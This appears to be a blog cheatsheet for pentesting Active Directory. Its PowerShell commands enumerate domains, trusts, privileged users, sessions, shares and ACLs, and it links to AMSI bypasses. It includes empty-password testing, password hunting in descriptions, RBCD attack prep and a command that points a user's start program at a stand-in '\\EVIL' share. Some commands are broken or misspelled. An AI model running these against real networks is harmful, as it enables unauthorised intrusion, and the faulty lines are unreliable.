---
layout: post
title: TA0007 Discovery - AD Collection & Enumeration
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
modified_date: 2022-09-22
permalink: /:categories/:title/
---

<!-- vscode-markdown-toc -->
* [PRE-REQUISITES](#PRE-REQUISITES)
	* [Downloading SharpHound](#DownloadingSharpHound)
	* [Running Powershell Tools](#RunningPowershellTools)
		* [Spawn an AD account](#SpawnanADaccount)
		* [Mandiant Commando VM](#MandiantCommandoVM)
		* [Setting variables for copy/paste](#Settingvariablesforcopypaste)
		* [Handling console errors](#Handlingconsoleerrors)
		* [Bypass AMSI](#BypassAMSI)
	* [Running Bloodhound](#RunningBloodhound)
* [Data Collection with SharpHound](#DataCollectionwithSharpHound)
* [Data Enumeration](#DataEnumeration)
	* [SHOOT General Properties](#SHOOTGeneralProperties)
		* [Domain properties](#Domainproperties)
		* [Forest properties](#Forestproperties)
		* [Kerberos Delegations](#KerberosDelegations)
		* [Privileged Users](#PrivilegedUsers)
		* [Privileged Machines](#PrivilegedMachines)
	* [ITER(ated) Enumeration](#ITERatedEnumeration)
		* [User groups](#Usergroups)
		* [Admin & OU access](#AdminOUaccess)
		* [RDP access](#RDPaccess)
		* [PSRemote access](#PSRemoteaccess)
	* [REFRESH(ed) Enumeration](#REFRESHedEnumeration)
		* [Last Logons for DA, EA, ...](#LastLogonsforDAEA...)
		* [Last logons on a computer](#Lastlogonsonacomputer)
		* [Last logons on an OU](#LastlogonsonanOU)
		* [Admin access to a computer](#Adminaccesstoacomputer)
	* [Misc](#Misc)
		* [T1134.001 Token Impersonation via Delegations](#T1134.001TokenImpersonationviaDelegations)
		* [T1135 Network Shares](#T1135NetworkShares)
		* [Txxx MSSQL servers](#TxxxMSSQLservers)
		* [TXXXX ACL](#TXXXXACL)
		* [T1046 SERVICES LOOTS](#T1046SERVICESLOOTS)
		* [MISC](#MISC)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

 !!! **Useful links** to [learn AD security](/sysadmin/win-ad-sec-awesome/#starting-your-journey) !!!

## <a name='PRE-REQUISITES'></a>PRE-REQUISITES 

### <a name='DownloadingSharpHound'></a>Downloading SharpHound

- [SharpHound latest Scripts & Binary](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
- [Python Alternative](https://github.com/fox-it/BloodHound.py)

### <a name='RunningPowershellTools'></a>Running Powershell Tools

- [PowerView CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)

#### <a name='SpawnanADaccount'></a>Spawn an AD account

:link: Check the **readthedocs of sharphound** to [spawn an AD account](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html#running-sharphound-from-a-non-domain-joined-system).

```powershell
runas /netonly /user:adm_x@dom.corp powershell
powershell -ep bypass
```

![funny reminder](/assets/images/pen-win-sys-spawn-cmd.jpg)

#### <a name='MandiantCommandoVM'></a>Mandiant Commando VM
```powershell
cd C:\tools\PowerSploit\Recon
Import-Module ./Recon.psm1
gcm -m Recon
```

#### <a name='Settingvariablesforcopypaste'></a>Setting variables for copy/paste
```powershell
$zforest = "corp"

$zdom = "contoso"
$zdom_fqdn = $zdom + "." + $zforest
$zdom_dn = "DC=contoso,DC=corp"

$zdom_dc = "DC01"
$zdom_dc_fqdn = $zdom_dc + "." + $zdom_fqdn
$zdom_dc_san = $zdom_dc + "$"
$zdom_dc_ip = ""

$ztarg_computer = "PC001"
$ztarg_computer_fqdn = $ztarg_computer + "." + $zdom_fqdn
$ztarg_computer_san = $ztarg_computer + "$"
$ztarg_computer_ip = ""

$ztarg_user = "admin"
$ztarg_OU = "Admins"
```
To verify the variables use the command:
```powershell
Get-Variable | Out-String
```

#### <a name='Handlingconsoleerrors'></a>Handling console errors
```powershell
$ErrorActionPreference = 'SilentlyContinue' # hide errors on out console
$ErrorActionPreference = 'Continue' # set back the display of the errors
```

#### <a name='BypassAMSI'></a>Bypass AMSI 
- [amsi.fails](https://amsi.fails)
- [S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- [notes.offsec-journey.com](https://notes.offsec-journey.com/evasion/amsi-bypass)

### <a name='RunningBloodhound'></a>Running Bloodhound 
```powershell
# Path for VM Mandiant Commando
# Start the Neo4J database
C:\Tools\neo4j-community\neo4j-community-3.5.1\bin>./neo4j.bat console
```

## <a name='DataCollectionwithSharpHound'></a>Data Collection with SharpHound

![SharpHound Cheatsheet](/assets/images/pen-win-ad-enum-sharphound-cheatsheet.png)

Image credit: [https://twitter.com/SadProcessor](https://twitter.com/SadProcessor)

Refresh sessions:
```powershell
# STEP 1 : go to bloodhound GUI / database statistics / clear session data
# STEP 2 : collect sessions again # e.g. every 15 minutes for 2 hours
 ./sharphound.exe -c session --Loop --LoopDuration 2:00:00 --LoopInterval 00:15:00 --domain $zdom_fqdn --domaincontroller $zdom_dc_fqdn
```
:link: Check the **readthedocs of sharphound** to [refresh the sessions](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html#the-session-loop-collection-method).

## <a name='DataEnumeration'></a>Data Enumeration

Commands below inspired more various [cheatsheets](/sysadmin/win-ad-sec-awesome/#OffensivePowershell).

**CAUTION: WORK IN PROGRESS HERE!**

![Enumeration Strategy](/assets/images/ad_enum_strat.png)

### <a name='SHOOTGeneralProperties'></a>SHOOT General Properties

#### <a name='Domainproperties'></a>Domain properties

```powershell
# check the domain object (fsmo, DCs, ntds replication, dns servers, machineaccountquota)
Get-DomainObject -identity $zdom_dn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn

# list the domain controllers
nltest /dclist:$zdom_fqdn
Get-NetDomainController -Domain $zdom_fqdn -Server $zdom_dc_fqdn

# enumerate the current domain controller policy
$DCPolicy = Get-DomainPolicy -Policy $zdom_dc_fqdn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
$DCPolicy.PrivilegeRights # user privilege rights on the dc...

# enumerate the current domain policy
$zdom_fqdn_pos = Get-DomainPolicy -Policy $zdom_fqdn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
$zdom_fqdn_pos.KerberosPolicy
$zdom_fqdn_pos.SystemAccess # password age/etc.

# who can dcsync
get-netuser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select -first 1 #get the domain's distinguisedname attribute
$zdom_dn = "DC=" + $zdom + ",DC=" + $zforest # only valid if 2 levels
# TO DEBUG : get-forest error ...
get-domainobjectacl $zdom_dn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -ResolveGUIDs | ? {
	($_.ObjectType -match 'replication-get') -or
	($_.ActiveDirectoryRights -match 'GenericAll')
} 

# audit the permissions of AdminSDHolder, resolving GUIDs
# TO DEBUG : get-forest error ...
$search_base = "CN=AdminSDHolder,CN=System," + $zdom_dn
Get-DomainObjectAcl -SearchBase $search_base -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# protected users / works with Win Server 2012 R2 and above
Get-NetGroupMember "Protected Users" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select membername
Get-NetGroupMember "Protected Users" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | select membername
```

#### <a name='Forestproperties'></a>Forest properties

```powershell
# get the trusts of the current domain/forest
nltest /domain_trusts
Get-NetDomainTrust -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ft -autosize TargetName, TrustDirection 
# TO DEBUG
Get-NetForestTrust -Forest $zforest

# find users with sidHistory set
Get-DomainUser -LDAPFilter '(sidHistory=*)' -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
```

#### <a name='KerberosDelegations'></a>Kerberos Delegations

Easy enumeration with **Impacket\FindDelegation.py**:

```powershell
# with password in the CLI
$zz = $zdom_fqdn + '/' + $zlat_user + ':"PASSWORD"'
.\findDelegation.py  $zz
# with kerberos auth / password not in the CLI
$zz = $zdom_fqdn + '/' + $zlat_user
.\findDelegation.py  $zz -k -no-pass
```

References :
- [thehacker.recipes/ad/movement/kerberos/delegations - KUD / KCD / RBCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations)
- [https://attack.mitre.org/techniques/T1134/001/](https://attack.mitre.org/techniques/T1134/001/)

#### <a name='PrivilegedUsers'></a>Privileged Users

- [Well-known Microsoft SID List](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab?redirectedfrom=MSDN)

```powershell
$ztarg_grp="Domain Admins"
#$ztarg_grp="Enterprise Admins"
#$ztarg_grp="Backup Operators"
#$ztarg_grp="Remote Desktop Users"
#$ztarg_grp="DNSAdmins"
Get-NetGroupMember $ztarg_grp -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | select membername
Invoke-UserHunter -Group $ztarg_grp -Domain $zdom_fqdn -DomainControler $zdom_dc_fqdn | select computername, membername
```

#### <a name='PrivilegedMachines'></a>Privileged Machines

```powershell
# find any machine accounts in privileged groups
Get-DomainGroup -AdminCount -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | Get-NetGroupMember -Recurse -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.MemberName -like '*$'}
```

### <a name='ITERatedEnumeration'></a>ITER(ated) Enumeration

To ITERate when owning new privileges (aka new account with new user groups): 
- powershell: spawn a shell, (generate PS Credential object)[/sysadmin/sys-win-ps-useful-queries/#PSCredentialinitialization], Rubeus PTT
- impacket : PTH, PTT, clear password

#### <a name='Usergroups'></a>User groups
```powershell
# identify if the new account is 'memberof' new groups 
get-netgroup -MemberIdentity $zlat_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select cn | ft -autosize >> .\grp_xxx.txt
```

#### <a name='AdminOUaccess'></a>Admin & OU access 
```powershell
# if new groups, find where the account is local admin
Find-LocalAdminAccess -ComputerDomain $zdom_fqdn -Server $zdom_dc_fqdn >> .\owned_machines.csv

# get the details of the owned machines with the OUs 
get-content .\owned_machines.csv | %{get-netcomputer $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn} | select-object -Property cn, dnshostname, distinguishedname | ft -autosize >> ;\owned_machines_w_ou.csv

```

#### <a name='RDPaccess'></a>RDP access
[Bloodhound readthedocs - edge canRDP ](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
```powershell
```

#### <a name='PSRemoteaccess'></a>PSRemote access
[Bloodhound readthedocs - edge canPSRemote ](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
```powershell
```


# if new groups, find where the account is local admin
### <a name='REFRESHedEnumeration'></a>REFRESH(ed) Enumeration

#### <a name='LastLogonsforDAEA...'></a>Last Logons for DA, EA, ...

```powershell
$ztarg_grp="Domain Admins"
#$ztarg_grp="Enterprise Admins"
#$ztarg_grp="Backup Operators"
#$ztarg_grp="Remote Desktop Users"
#$ztarg_grp="DNSAdmins"

# get the priviledge users (from above the DA) sorted by last logon
Get-NetGroupMember $ztarg_grp -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | %{Get-NetUser $_.membername -domain $zdom_fqdn -domaincontroller $zdom_dc_fqdn | select samAccountName,LogonCount,LastLogon,mail} | Sort-Object -Descending -Property lastlogon

# find admin groups based on "adm" keyword
Get-NetGroup -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn *adm* 

# PowerView: find where DA has logged on / and current user has access
# can be long and noisy, does net share discovery over \\machine\IPC$
Invoke-UserHunter -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
Invoke-UserHunter -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
Invoke-UserHunter -CheckAccess -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select username, computername, IPAddress
 ./sharphound.exe -c computeronly --domain $zdom_fqdn --domaincontroller $zdom_dc_fqdn
```

#### <a name='Lastlogonsonacomputer'></a>Last logons on a computer
```powershell
# get actively logged users on a computer
Get-NetLoggedon -ComputerName $ztarg_computer_fqdn

# get last logged users on a computer / uses remote registry / can be blocked
Get-LastLoggedon -ComputerName $ztarg_computer -Credential $zlat_creds

# testing account "john_doe" with empty passwords 
$mycreds = New-Object System.Management.Automation.PSCredential("john_doe", (new-object System.Security.SecureString))
Invoke-Command -Credential $mycreds -ComputerName $computer -ScriptBlock {whoami; hostname}
```

#### <a name='LastlogonsonanOU'></a>Last logons on an OU
```powershell
# Get the logged on users for all machines in any *server* OU in a particular domain
Get-DomainOU -Identity $computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-DomainComputer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -SearchBase $_.distinguishedname -Properties dnshostname | %{Get-NetLoggedOn -ComputerName $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn}}
```

#### <a name='Adminaccesstoacomputer'></a>Admin access to a computer

```powershell
# check smb admin share access 
dir \\$ztarg_computer_fqdn\c$

# check local admin
Find-LocalAdminAccess -ComputerDomain $zdom_fqdn -Server $zdom_dc_fqdn -ComputerName $ztarg_computer_fqdn

# ExecuteDCOM: check if rpc service is active / granted
get-wmiobject -Class win32_operatingsystem -Computername $ztarg_computer_fqdn
```

ExecuteDCOM ressources:
- [CobaltStrike remote shell via DCOM execution](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [Bloodhound readthedocs - edge ExecuteDCOM ](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#executedcom)

CanPSRemote ressources:
- [JMVWORK Sysadmin - Create a PSSession](/sysadmin/sys-win-ps-useful-queries/#PSSessionInvoke-Command)
- [Bloodhound readthedocs - edge canPSRemote ](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#executedcom)


### <a name='Misc'></a>Misc

#### <a name='T1134.001TokenImpersonationviaDelegations'></a>T1134.001 Token Impersonation via Delegations
- Prepare RBCD attack :

```powershell
# requirement : DC > win 2012
Get-DomainController -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select name.osversion | fl
# requirement : target user is not a member of the "Protected Users" group
Get-NetGroupMember "Protected Users" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Recurse | select membername
# requirement : MachineAccountQuota / possibility to create a new computer
Get-DomainObject -identity $zdom_dn -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select ms-ds-machineaccountquota
# requirement  : check constraint delegation setting on the target computer 
Get-NetComputer $computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select name,msds-allowedtoactonbehalfofotheridentity | fl
# check targetuser is not part of protected users 

# Target Computer Name : $computer
# Admin on Target Computer : right click on the object in bloodhound
# Fake Computer Name : fakecomputer
# Fake Computer SID : get-netcomputer fakecomputer | select samaccountname,objectsid
# Fake Computer password : Password123
```


References:
- [https://attack.mitre.org/techniques/T1087/002/](https://attack.mitre.org/techniques/T1087/002/)


```powershell
# look for a user from his objectsid
$objectsid = 'S-1-5-21-123'
get-netuser -domain $zdom_fqdn -domaincontroller $zdom_dc_fqdn | ?{$_.objectsid -eq $objectsid} | select -first 1

# look for the keyword "pass" in the description attribute for each user in the domain
Find-UserField -SearchField Description -SearchTerm "pass" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn

# return the local group *members* of a remote server using Win32 API methods (faster but less info)
Get-NetLocalGroupMember -Method API -ComputerName <Server>.<FQDN> -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn

```


- [https://attack.mitre.org/techniques/T1615/](https://attack.mitre.org/techniques/T1615/)

```powershell
# local admin rights
Find-GPOComputerAdmin -ComputerName $computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
Get-NetOU $OU -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-NetComputer -ADSPath $_ -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn}

# reset password
Get-NetGPO -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name -RightsFilter "ResetPassword" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn }

# RDP access
Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity $user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
Get-DomainGPOUserLocalGroupMapping -LocalGroup RDP -Identity $group -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# list users and GPO he can modifiy
Get-NetGPO -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn }

# retrieve all the computer dns host names a GPP password applies to
Get-DomainOU -GPLink '<GPP_GUID>' -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn}

# enumerate what machines that a particular user/group identity has local admin rights to
#   Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
Get-DomainGPOUserLocalGroupMapping -Identity $user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
Get-DomainGPOUserLocalGroupMapping -Identity $group -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# export a csv of all GPO mappings
Get-DomainGPOUserLocalGroupMapping -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv

# find all policies applied to a computer/server
Get-DomainGPO -ComputerIdentity $computer -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn

# find all policies applied to an user
Find-GPOLocation -UserName $user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn
```

#### <a name='T1135NetworkShares'></a>T1135 Network Shares

References:
- [https://attack.mitre.org/techniques/T1135](https://attack.mitre.org/techniques/T1135/)

```powershell
# find share folders in the domain
Invoke-ShareFinder -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn

# use alternate credentials for searching for files on the domain
#   Find-InterestingDomainShareFile == old Invoke-FileFinder
Find-InterestingDomainShareFile -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn -Credential $zlat_creds
```

#### <a name='TxxxMSSQLservers'></a>Txxx MSSQL servers

References:
- [BloodHound Edge SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)
- [PowerUpSQL CheatSheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

```powershell
# Invoke-UserHunter -UserIdentity dba_admin > mssql_instances_shorted.txt
# sed 's/MSSQLSvc\/\([a-z,A-Z,0-9]*\)\(\.contoso\.corp:\|:\)\?\(.*\)/\1/g' mssql_instances_shorted.txt | sort -u > mssql_servers_shorted.txt
# get-content mssql_servers_shorted.txt | get-netcomputer -Identity $_ -properties cn,description,OperatingSystem,OperatingSystemVersion,isCriticalSystemObject

 Get-SQLInstanceDomain -Verbose -DomainController $zdom_dc_fqdn -Username CONTOSO\mssql_admin -password Password01 > mssql_instances.txt
```

#### <a name='TXXXXACL'></a>TXXXX ACL

References:
- [BloodHound Edge GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall)
- [BloodHound Edge WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl)
- [BloodHound Edge GenericWrite](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite)

```powershell
# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn  | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}

# enumerate who has rights to the $user in $zdom_fqdn, resolving rights GUIDs to names
Get-DomainObjectAcl -Identity $user -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# gather info on security groups
Get-ObjectAcl -SamAccountName "Domain Computers" -ResolveGUIDs -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
Invoke-ACLScanner -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.IdentityReference -match "RDPUsers"} 
```

#### <a name='T1046SERVICESLOOTS'></a>T1046 SERVICES LOOTS

References:
- [https://attack.mitre.org/techniques/T1046](https://attack.mitre.org/techniques/T1046/)

```powershell
# find all users with an SPN set (likely service accounts)
Get-NetUser -SPN -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select name, description, lastlogon, badpwdcount, logoncount, useraccountcontrol, memberof

# wsman
# mssqlsvc
sed 's/MSSQLSvc\/\([a-z,A-Z,0-9]*\)\(\.contoso\.corp:\|:\)\?\(.*\)/\1/g' mssql_instances_shorted.txt | sort -u > mssql_servers_shorted.txt

# find all service accounts in "Domain Admins"
Get-DomainUser -SPN -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.memberof -match 'Domain Admins'}

# find all Win2008 R2 computers (likely servers) and IP/ICMP reachable
Get-NetComputer -OperatingSystem "Windows 2008*" -Ping -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
```

#### <a name='MISC'></a>MISC
```powershell
# all disabled users
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=2)" -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
Get-DomainUser -UACFilter ACCOUNTDISABLE -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# find all computers in a given OU
Get-DomainComputer -SearchBase "ldap://OU=..." -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# enumerate all gobal catalogs in the forest
Get-ForestGlobalCatalog -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# turn a list of computer short names to FQDNs, using a global catalog
gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn }

# save a PowerView object to disk for later usage
Get-DomainUser -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | Export-Clixml user.xml
$ztarg_users = Import-Clixml user.xml

# enumerate all groups in a domain that don't have a global scope, returning just group names
Get-DomainGroup -GroupScope NotGlobal -Properties name -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 

# Set the owner of 'dfm' in the current domain to $ztarg_user
Set-DomainObjectOwner -Identity dfm -OwnerIdentity $ztarg_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
```